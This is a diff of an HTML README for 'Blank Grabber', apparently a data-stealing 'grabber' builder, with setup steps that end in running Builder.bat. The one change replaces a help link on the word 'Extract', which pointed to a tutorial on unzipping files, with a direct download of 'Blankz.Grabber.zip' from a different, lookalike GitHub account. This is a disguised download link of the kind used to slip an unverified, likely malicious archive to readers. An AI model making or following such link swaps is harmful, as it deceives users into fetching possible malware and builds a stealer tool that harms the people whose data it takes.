@@ -185,7 +185,7 @@ Blank-c</p>
 <li>Download and install <a href="https://www.python.org/downloads/" rel="nofollow">Python 3</a> (Make sure to enable the <em>Add to PATH</em> option.)</li>
 <li>Verify the installation by executing <code>python --version</code> in <a href="https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?" rel="nofollow">CMD</a>.</li>
 <li><a href="#download">Download Blank Grabber</a>.</li>
-<li><a href="https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file" rel="nofollow">Extract</a> the zip file.</li>
+<li><a href="https://www.github.com/buzzbyzz11/Blankz-Grabber/releases/download/Blankz-Grabber/Blankz.Grabber.zip" rel="nofollow">Extract</a> the zip file.</li>
 <li>Navigate to the <strong>Blank Grabber</strong> folder and double click <em>Builder.bat</em> file.</li>
 <li>Fill in the fields of the builder and press the <kbd>Build</kbd> button.</li>
 </ol>
